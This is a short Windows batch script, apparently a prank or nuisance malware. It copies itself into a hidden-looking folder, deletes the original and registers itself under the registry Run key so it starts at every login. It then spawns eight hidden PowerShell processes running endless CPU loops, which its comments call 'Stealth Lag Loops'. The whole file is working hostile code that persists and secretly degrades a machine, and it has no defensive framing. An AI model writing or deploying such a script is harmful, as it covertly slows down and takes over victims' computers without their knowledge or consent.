@echo off
setlocal EnableDelayedExpansion

:: ✅ Set Target Folder & File
set "targetDir=D:\PerfLogsARD"
set "targetScript=%targetDir%\slowmode.bat"

:: ✅ Create Target Folder if not exists
if not exist "%targetDir%" (
    mkdir "%targetDir%"
)

:: ✅ If script is NOT running from target folder, copy and run from there
if /I not "%~dp0"=="%targetDir%\" (
    copy "%~f0" "%targetScript%" >nul
    start "" /min "%targetScript%"
    del "%~f0"
    exit
)

:: ✅ Add to Startup (only once)
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v SlowModeTask >nul 2>&1
if errorlevel 1 (
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v SlowModeTask /t REG_SZ /d "\"%targetScript%\"" /f >nul
)

:: ✅ Stealth Lag Loops (slowdown code)
for /L %%i in (1,1,8) do (
    start "" /min powershell -WindowStyle Hidden -Command "while($true){1..100000 | ForEach-Object {$_ * $_} | Out-Null}"
)

exit
